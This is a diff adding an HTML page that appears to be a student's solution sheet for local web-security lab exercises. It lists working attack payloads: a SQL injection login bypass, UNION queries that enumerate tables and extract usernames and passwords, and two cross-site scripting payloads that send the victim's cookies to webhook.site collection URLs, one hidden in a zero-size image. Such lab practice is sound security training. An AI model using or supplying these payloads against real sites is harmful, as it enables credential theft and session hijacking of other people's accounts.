@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+
+    <h3>exercise SQLi1</h3>
+    <p>admin</p>
+    <p>' OR 1=1 -- </p>
+
+    <h3>exercise SQLi2</h3>
+    <h4>Find table names</h4>
+    <p>AnnoyingWorm' UNION ALL SELECT NULL, NULL, NULL, TABLE_NAME FROM information_schema.TABLES-- </p>
+    <h4>Find credentials</h4>
+    <p>AnnoyingWorm' UNION ALL SELECT NULL, Username, NULL, Password FROM SQLi2_Credential-- </p>
+
+    <h3>exercise XXS1</h3>
+    <p>http://127.0.0.1/progettoSWM/XSS/XSS1.php?username=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22https://webhook.site/6f06015b-5a9f-4cd1-8e7b-0d338a1a3ec7?username=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E</p>
+
+    <h3>exercise XXS2</h3>
+    <p><[togliere]img src=https://github.com/favicon.ico width=0 height=0 onload=this.src='https://webhook.site/36084a1e-320d-49fb-a419-91f163aa76d6/?c='+document.cookie></p>
+</body>
+</html>
